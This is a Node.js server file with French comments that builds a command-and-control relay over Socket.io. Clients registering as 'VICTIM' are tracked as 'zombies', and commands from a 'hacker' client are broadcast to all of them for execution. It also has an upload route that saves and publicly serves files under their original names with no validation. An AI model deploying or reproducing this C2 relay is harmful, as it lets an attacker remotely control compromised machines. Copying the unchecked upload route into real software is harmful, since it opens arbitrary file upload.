const express = require("express");
const http = require("http"); // 1. On importe le module HTTP natif
const { Server } = require("socket.io"); // 2. On importe Socket.io
const multer = require("multer");
const path = require("path");
const fs = require("fs");

const app = express();
// 3. C'est ici le changement critique : on crée le serveur manuellement
const server = http.createServer(app);
const io = new Server(server); // On attache Socket.io à ce serveur

// Gestion du Port pour Render (Prod) ou 3000 (Local)
const PORT = process.env.PORT || 3000;

// --- CONFIGURATION ---
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, "uploads/"),
  filename: (req, file, cb) => cb(null, file.originalname),
});
const upload = multer({ storage: storage });

app.use(express.static("public"));
app.use("/uploads", express.static("uploads"));

// --- ROUTES ---
app.post("/upload", upload.single("file"), (req, res) => {
  if (!req.file) return res.status(400).json({ error: "Aucun fichier" });
  console.log(`[UPLOAD] Fichier reçu : ${req.file.originalname}`);
  res.json({ filePath: `/uploads/${req.file.filename}` });
});

// --- LOGIQUE HACKER (C2) VIA SOCKET.IO ---
let zombies = [];

io.on("connection", (socket) => {
  // console.log('Nouvelle connexion socket:', socket.id);

  // Un client s'identifie (Soit Victime, Soit Hacker)
  socket.on("register", (role) => {
    if (role === "VICTIM") {
      zombies.push(socket.id);
      console.log(`🧟 [ZOMBIE] Nouvelle victime connectée : ${socket.id}`);
      // On prévient le hacker qu'il a une nouvelle cible
      io.emit("hacker_update", { count: zombies.length, last_id: socket.id });
    }
  });

  // Le Hacker envoie une commande
  socket.on("issue_command", (cmd) => {
    console.log(`💀 [COMMANDE] ${cmd.type}`);
    // On diffuse l'ordre à toutes les victimes connectées
    socket.broadcast.emit("execute_order", cmd);
  });

  socket.on("disconnect", () => {
    zombies = zombies.filter((id) => id !== socket.id);
    io.emit("hacker_update", { count: zombies.length });
  });
});

// 4. IMPORTANT : On lance "server" et non plus "app"
server.listen(PORT, () => {
  console.log(`🔥 Serveur lancé sur http://localhost:${PORT}`);
});
